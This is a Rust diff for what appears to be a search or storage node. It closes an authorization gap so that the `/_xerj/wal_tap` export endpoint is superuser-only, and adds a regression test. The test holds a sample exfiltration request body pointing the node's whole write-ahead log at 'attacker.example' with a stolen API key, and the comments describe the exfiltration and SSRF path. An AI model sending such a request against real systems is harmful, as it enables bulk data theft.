@@ -1328,6 +1328,27 @@ fn decide(
             authorize_body(principal, aliases, shape, body, default)
         }
         Target::Cluster => {
+            // `/_xerj/*` is the node's own operator namespace, and its first
+            // inhabitant (`_xerj/wal_tap`, issue #320) is a whole-node export
+            // primitive: one `PUT` with `target_url` pointing anywhere and
+            // `indices: ["*"]` streams every index on this node to an
+            // attacker-chosen host, with an operator-supplied `Authorization`
+            // header attached — a data exfiltration channel and an
+            // authenticated SSRF in the same request.
+            //
+            // Nothing here is index-scoped, so there is no per-index decision
+            // to make and the reasoning is the snapshot/restore one below:
+            // superuser-only. That covers the reads too. `GET /_xerj/wal_tap`
+            // echoes `target_url` and `GET /_xerj/wal_tap/_stats` enumerates
+            // the node's full index inventory, and both are `cluster_is_read`,
+            // so without this arm a key scoped to one index could read them.
+            if segs.first().map(String::as_str) == Some("_xerj") {
+                return Err(forbidden(
+                    principal,
+                    "<node>",
+                    required_privilege(method, segs, 1),
+                ));
+            }
             // Snapshot and restore that name no indices cover *every* index on
             // the node, brains included. There is no per-index decision to
             // make, so they are superuser-only.
@@ -2268,6 +2289,69 @@ mod tests {
             "/_snapshot/repo/s1",
             "{}"
         ));
+    }
+
+    /// `PUT /_xerj/wal_tap` (issue #320) is a whole-node export primitive:
+    /// `target_url` names any host on the network, `indices: ["*"]` names
+    /// every index on this node, and the tap attaches an operator-supplied
+    /// `Authorization` header to the requests it makes — exfiltration and
+    /// authenticated SSRF in one call.
+    ///
+    /// It reached `Target::Cluster` through the `_`-prefix arm, `body_shape`
+    /// returned `BodyShape::None` so `body_targets` produced no demands, and a
+    /// mutating cluster verb naming nothing falls through to
+    /// `Principal::Unscoped => Ok(())`. Every unscoped key on the node could
+    /// therefore stream the whole node off it. Same reasoning as
+    /// `unbounded_snapshot_is_superuser_only` above, same answer.
+    ///
+    /// The reads matter too and are covered by the same arm: `GET
+    /// /_xerj/wal_tap` echoes `target_url`, and `GET /_xerj/wal_tap/_stats`
+    /// enumerates the node's whole index inventory with no principal filter
+    /// (`_xerj` has no `prune_sites` entry, and adding one would not help — a
+    /// scoped key has no business knowing the tap's target either). Both are
+    /// `cluster_is_read`, so before this arm a key scoped to a single index
+    /// could read them.
+    #[test]
+    fn the_wal_tap_export_primitive_is_superuser_only() {
+        let legacy = unscoped();
+        let one_index = scoped(&["logs-2026"], &[Privilege::ReadIndex]);
+
+        // The write: an unscoped key must not be able to point this node's
+        // whole WAL at a host it chose.
+        let exfiltrate = r#"{"enabled":true,"target_url":"http://attacker.example",
+                             "indices":["*"],"target_auth":"ApiKey stolen"}"#;
+        assert!(!check(&legacy, Method::PUT, "/_xerj/wal_tap", exfiltrate));
+        assert!(!check(
+            &one_index,
+            Method::PUT,
+            "/_xerj/wal_tap",
+            exfiltrate
+        ));
+        assert!(!check(&legacy, Method::DELETE, "/_xerj/wal_tap", ""));
+
+        // The reads: the target URL and the node's index inventory.
+        assert!(!check(&legacy, Method::GET, "/_xerj/wal_tap", ""));
+        assert!(!check(&one_index, Method::GET, "/_xerj/wal_tap", ""));
+        assert!(!check(&legacy, Method::GET, "/_xerj/wal_tap/_stats", ""));
+        assert!(!check(&one_index, Method::GET, "/_xerj/wal_tap/_stats", ""));
+
+        // The namespace, not just the route: a second `_xerj` endpoint must
+        // inherit this rather than have to remember it.
+        assert!(!check(&legacy, Method::GET, "/_xerj/anything", ""));
+        assert!(!check(&legacy, Method::POST, "/_xerj/anything/_do", ""));
+
+        // And the operator can still drive it.
+        for (method, path) in [
+            (Method::GET, "/_xerj/wal_tap"),
+            (Method::PUT, "/_xerj/wal_tap"),
+            (Method::DELETE, "/_xerj/wal_tap"),
+            (Method::GET, "/_xerj/wal_tap/_stats"),
+        ] {
+            assert!(
+                check(&Principal::Superuser, method.clone(), path, "{}"),
+                "the superuser must keep {method} {path}"
+            );
+        }
     }
 
     /// The pattern short-circuit in [`authorize_expression`] is safe because
